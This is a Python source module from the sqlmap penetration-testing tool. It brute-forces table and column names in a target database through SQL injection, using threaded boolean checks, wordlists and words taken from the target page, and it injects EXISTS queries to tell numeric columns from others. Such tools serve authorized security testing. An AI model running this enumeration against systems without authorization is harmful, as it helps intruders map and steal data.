#!/usr/bin/env python

"""
Copyright (c) 2006-2018 sqlmap developers (http://sqlmap.org/)
See the file 'LICENSE' for copying permission
"""

import time

from lib.core.common import clearConsoleLine
from lib.core.common import dataToStdout
from lib.core.common import filterListValue
from lib.core.common import getFileItems
from lib.core.common import Backend
from lib.core.common import getPageWordSet
from lib.core.common import hashDBWrite
from lib.core.common import randomInt
from lib.core.common import randomStr
from lib.core.common import readInput
from lib.core.common import safeStringFormat
from lib.core.common import safeSQLIdentificatorNaming
from lib.core.common import unsafeSQLIdentificatorNaming
from lib.core.data import conf
from lib.core.data import kb
from lib.core.data import logger
from lib.core.enums import DBMS
from lib.core.enums import HASHDB_KEYS
from lib.core.enums import PAYLOAD
from lib.core.exception import SqlmapDataException
from lib.core.exception import SqlmapMissingMandatoryOptionException
from lib.core.settings import BRUTE_COLUMN_EXISTS_TEMPLATE
from lib.core.settings import BRUTE_TABLE_EXISTS_TEMPLATE
from lib.core.settings import METADB_SUFFIX
from lib.core.threads import getCurrentThreadData
from lib.core.threads import runThreads
from lib.request import inject

def _addPageTextWords():
    wordsList = []

    infoMsg = "adding words used on web page to the check list"
    logger.info(infoMsg)
    pageWords = getPageWordSet(kb.originalPage)

    for word in pageWords:
        word = word.lower()

        if len(word) > 2 and not word[0].isdigit() and word not in wordsList:
            wordsList.append(word)

    return wordsList

def tableExists(tableFile, regex=None):
    if kb.tableExistsChoice is None and not any(_ for _ in kb.injection.data if _ not in (PAYLOAD.TECHNIQUE.TIME, PAYLOAD.TECHNIQUE.STACKED)) and not conf.direct:
        warnMsg = "it's not recommended to use '%s' and/or '%s' " % (PAYLOAD.SQLINJECTION[PAYLOAD.TECHNIQUE.TIME], PAYLOAD.SQLINJECTION[PAYLOAD.TECHNIQUE.STACKED])
        warnMsg += "for common table existence check"
        logger.warn(warnMsg)

        message = "are you sure you want to continue? [y/N] "
        kb.tableExistsChoice = readInput(message, default='N', boolean=True)

        if not kb.tableExistsChoice:
            return None

    result = inject.checkBooleanExpression("%s" % safeStringFormat(BRUTE_TABLE_EXISTS_TEMPLATE, (randomInt(1), randomStr())))

    if conf.db and Backend.getIdentifiedDbms() in (DBMS.ORACLE, DBMS.DB2):
        conf.db = conf.db.upper()

    if result:
        errMsg = "can't use table existence check because of detected invalid results "
        errMsg += "(most likely caused by inability of the used injection "
        errMsg += "to distinguish erroneous results)"
        raise SqlmapDataException(errMsg)

    message = "which common tables (wordlist) file do you want to use?\n"
    message += "[1] default '%s' (press Enter)\n" % tableFile
    message += "[2] custom"
    choice = readInput(message, default='1')

    if choice == '2':
        message = "what's the custom common tables file location?\n"
        tableFile = readInput(message) or tableFile

    infoMsg = "checking table existence using items from '%s'" % tableFile
    logger.info(infoMsg)

    tables = getFileItems(tableFile, lowercase=Backend.getIdentifiedDbms() in (DBMS.ACCESS,), unique=True)
    tables.extend(_addPageTextWords())
    tables = filterListValue(tables, regex)

    threadData = getCurrentThreadData()
    threadData.shared.count = 0
    threadData.shared.limit = len(tables)
    threadData.shared.value = []
    threadData.shared.unique = set()

    def tableExistsThread():
        threadData = getCurrentThreadData()

        while kb.threadContinue:
            kb.locks.count.acquire()
            if threadData.shared.count < threadData.shared.limit:
                table = safeSQLIdentificatorNaming(tables[threadData.shared.count], True)
                threadData.shared.count += 1
                kb.locks.count.release()
            else:
                kb.locks.count.release()
                break

            if conf.db and METADB_SUFFIX not in conf.db and Backend.getIdentifiedDbms() not in (DBMS.SQLITE, DBMS.ACCESS, DBMS.FIREBIRD):
                fullTableName = "%s.%s" % (conf.db, table)
            else:
                fullTableName = table

            result = inject.checkBooleanExpression("%s" % safeStringFormat(BRUTE_TABLE_EXISTS_TEMPLATE, (randomInt(1), fullTableName)))

            kb.locks.io.acquire()

            if result and table.lower() not in threadData.shared.unique:
                threadData.shared.value.append(table)
                threadData.shared.unique.add(table.lower())

                if conf.verbose in (1, 2) and not conf.api:
                    clearConsoleLine(True)
                    infoMsg = "[%s] [INFO] retrieved: %s\n" % (time.strftime("%X"), unsafeSQLIdentificatorNaming(table))
                    dataToStdout(infoMsg, True)

            if conf.verbose in (1, 2):
                status = '%d/%d items (%d%%)' % (threadData.shared.count, threadData.shared.limit, round(100.0 * threadData.shared.count / threadData.shared.limit))
                dataToStdout("\r[%s] [INFO] tried %s" % (time.strftime("%X"), status), True)

            kb.locks.io.release()

    try:
        runThreads(conf.threads, tableExistsThread, threadChoice=True)

    except KeyboardInterrupt:
        warnMsg = "user aborted during table existence "
        warnMsg += "check. sqlmap will display partial output"
        logger.warn(warnMsg)

    clearConsoleLine(True)
    dataToStdout("\n")

    if not threadData.shared.value:
        warnMsg = "no table(s) found"
        logger.warn(warnMsg)
    else:
        for item in threadData.shared.value:
            if conf.db not in kb.data.cachedTables:
                kb.data.cachedTables[conf.db] = [item]
            else:
                kb.data.cachedTables[conf.db].append(item)

    for _ in ((conf.db, item) for item in threadData.shared.value):
        if _ not in kb.brute.tables:
            kb.brute.tables.append(_)

    hashDBWrite(HASHDB_KEYS.KB_BRUTE_TABLES, kb.brute.tables, True)

    return kb.data.cachedTables

def columnExists(columnFile, regex=None):
    if kb.columnExistsChoice is None and not any(_ for _ in kb.injection.data if _ not in (PAYLOAD.TECHNIQUE.TIME, PAYLOAD.TECHNIQUE.STACKED)) and not conf.direct:
        warnMsg = "it's not recommended to use '%s' and/or '%s' " % (PAYLOAD.SQLINJECTION[PAYLOAD.TECHNIQUE.TIME], PAYLOAD.SQLINJECTION[PAYLOAD.TECHNIQUE.STACKED])
        warnMsg += "for common column existence check"
        logger.warn(warnMsg)

        message = "are you sure you want to continue? [y/N] "
        kb.columnExistsChoice = readInput(message, default='N', boolean=True)

        if not kb.columnExistsChoice:
            return None

    if not conf.tbl:
        errMsg = "missing table parameter"
        raise SqlmapMissingMandatoryOptionException(errMsg)

    if conf.db and Backend.getIdentifiedDbms() in (DBMS.ORACLE, DBMS.DB2):
        conf.db = conf.db.upper()

    result = inject.checkBooleanExpression(safeStringFormat(BRUTE_COLUMN_EXISTS_TEMPLATE, (randomStr(), randomStr())))

    if result:
        errMsg = "can't use column existence check because of detected invalid results "
        errMsg += "(most likely caused by inability of the used injection "
        errMsg += "to distinguish erroneous results)"
        raise SqlmapDataException(errMsg)

    message = "which common columns (wordlist) file do you want to use?\n"
    message += "[1] default '%s' (press Enter)\n" % columnFile
    message += "[2] custom"
    choice = readInput(message, default='1')

    if choice == '2':
        message = "what's the custom common columns file location?\n"
        columnFile = readInput(message) or columnFile

    infoMsg = "checking column existence using items from '%s'" % columnFile
    logger.info(infoMsg)

    columns = getFileItems(columnFile, unique=True)
    columns.extend(_addPageTextWords())
    columns = filterListValue(columns, regex)

    table = safeSQLIdentificatorNaming(conf.tbl, True)

    if conf.db and METADB_SUFFIX not in conf.db and Backend.getIdentifiedDbms() not in (DBMS.SQLITE, DBMS.ACCESS, DBMS.FIREBIRD):
        table = "%s.%s" % (safeSQLIdentificatorNaming(conf.db), table)

    kb.threadContinue = True
    kb.bruteMode = True

    threadData = getCurrentThreadData()
    threadData.shared.count = 0
    threadData.shared.limit = len(columns)
    threadData.shared.value = []

    def columnExistsThread():
        threadData = getCurrentThreadData()

        while kb.threadContinue:
            kb.locks.count.acquire()
            if threadData.shared.count < threadData.shared.limit:
                column = safeSQLIdentificatorNaming(columns[threadData.shared.count])
                threadData.shared.count += 1
                kb.locks.count.release()
            else:
                kb.locks.count.release()
                break

            result = inject.checkBooleanExpression(safeStringFormat(BRUTE_COLUMN_EXISTS_TEMPLATE, (column, table)))

            kb.locks.io.acquire()

            if result:
                threadData.shared.value.append(column)

                if conf.verbose in (1, 2) and not conf.api:
                    clearConsoleLine(True)
                    infoMsg = "[%s] [INFO] retrieved: %s\n" % (time.strftime("%X"), unsafeSQLIdentificatorNaming(column))
                    dataToStdout(infoMsg, True)

            if conf.verbose in (1, 2):
                status = "%d/%d items (%d%%)" % (threadData.shared.count, threadData.shared.limit, round(100.0 * threadData.shared.count / threadData.shared.limit))
                dataToStdout("\r[%s] [INFO] tried %s" % (time.strftime("%X"), status), True)

            kb.locks.io.release()

    try:
        runThreads(conf.threads, columnExistsThread, threadChoice=True)

    except KeyboardInterrupt:
        warnMsg = "user aborted during column existence "
        warnMsg += "check. sqlmap will display partial output"
        logger.warn(warnMsg)

    clearConsoleLine(True)
    dataToStdout("\n")

    if not threadData.shared.value:
        warnMsg = "no column(s) found"
        logger.warn(warnMsg)
    else:
        columns = {}

        for column in threadData.shared.value:
            if Backend.getIdentifiedDbms() in (DBMS.MYSQL,):
                result = not inject.checkBooleanExpression("%s" % safeStringFormat("EXISTS(SELECT %s FROM %s WHERE %s REGEXP '[^0-9]')", (column, table, column)))
            else:
                result = inject.checkBooleanExpression("%s" % safeStringFormat("EXISTS(SELECT %s FROM %s WHERE ROUND(%s)=ROUND(%s))", (column, table, column, column)))

            if result:
                columns[column] = "numeric"
            else:
                columns[column] = "non-numeric"

        kb.data.cachedColumns[conf.db] = {conf.tbl: columns}

        for _ in ((conf.db, conf.tbl, item[0], item[1]) for item in columns.items()):
            if _ not in kb.brute.columns:
                kb.brute.columns.append(_)

        hashDBWrite(HASHDB_KEYS.KB_BRUTE_COLUMNS, kb.brute.columns, True)

    return kb.data.cachedColumns
